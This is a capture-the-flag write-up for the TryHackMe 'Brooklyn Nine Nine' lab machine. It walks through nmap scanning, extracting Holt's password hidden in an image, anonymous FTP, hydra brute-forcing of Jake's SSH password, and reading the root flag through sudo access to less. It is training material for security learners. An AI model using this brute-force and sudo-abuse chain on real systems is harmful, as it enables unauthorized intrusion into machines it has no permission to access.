
# Brooklyn Nine Nine CTF Writeup | Tryhackme

This is a **Brooklyn Nine Nine** themed CTF, designed for beginners. Let’s jump into it and check out this machine.



## Nmap Scan

Scanning the machine with Nmap:

```bash
nmap -sVC -p- IP
````

### Results

```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.1.58
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
```

We have three interesting services:

* **Apache web server (80)**
* **Anonymous FTP (21)**
* **SSH (22)**

---

## Enumeration

### Port 80 - Web Server

* The website displays a **B99 banner**.
* Looking at the source code, we find an image: `brooklyn99.jpg`.

```bash
wget http://IP/brooklyn99.jpg
```

* The page hints at **steganography**.

We use `stegcracker` to analyze the image:

```bash
stegcracker brooklyn99.jpg ~/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
```

**Result:**

```
Successfully cracked file with password: admin
Your file has been written to: brooklyn99.jpg.out
```

```bash
cat brooklyn99.jpg.out
```

Output:

```
Holts Password:
fluffydog12@ninenine
```

So we have **credentials for SSH**.

---

### Port 21 - Anonymous FTP

Login using:

```bash
ftp IP
# username: anonymous
# password: anonymous
```

We find a file: `note_to_jake.txt`.

Contents:

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

---

### Port 22 - SSH

Using Holt’s credentials:

```bash
ssh holt@IP
# password: fluffydog12@ninenine
```

We get access to Holt’s account. Inside, we find:

* `user.txt` ✅ (user flag)
* `nano.save` (restricted to root)

Checking `/etc/passwd`, we discover two more potential users: **jake** & **amy**.

---

## Privilege Escalation

### Brute-forcing Jake’s Password

We try brute-forcing Jake’s SSH login:

```bash
hydra -l jake -P ~/Tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt ssh://IP
```

**Result:**

```
[22][ssh] host: IP   login: jake   password: 987654321
```

We can now login as Jake:

```bash
ssh jake@IP
# password: 987654321
```

### Sudo Privileges

Checking Jake’s privileges:

```bash
sudo -l
```

Jake has sudo access for `less`. Using this, we can read root’s flag:

```bash
sudo less /root/root.txt
```

Flag:

```
Here is the flag: xxxxxxxxxxxxxxxxxxxxxxxxxx
```

✅ **Root access achieved!**

---

## Alternate Method

* From Holt’s account, running `sudo -l` shows sudo access for `nano`.
* Escalation to root can also be done using **nano**.

---

## Conclusion

We successfully rooted the **Brooklyn Nine Nine CTF** box by:

1. Enumerating services with Nmap
2. Extracting Holt’s SSH credentials via steganography
3. Using Anonymous FTP to confirm Jake’s weak password
4. Brute-forcing Jake’s account with Hydra
5. Escalating privileges to root using `less` (or `nano`)

🎉 **Box pwned!**

```
```

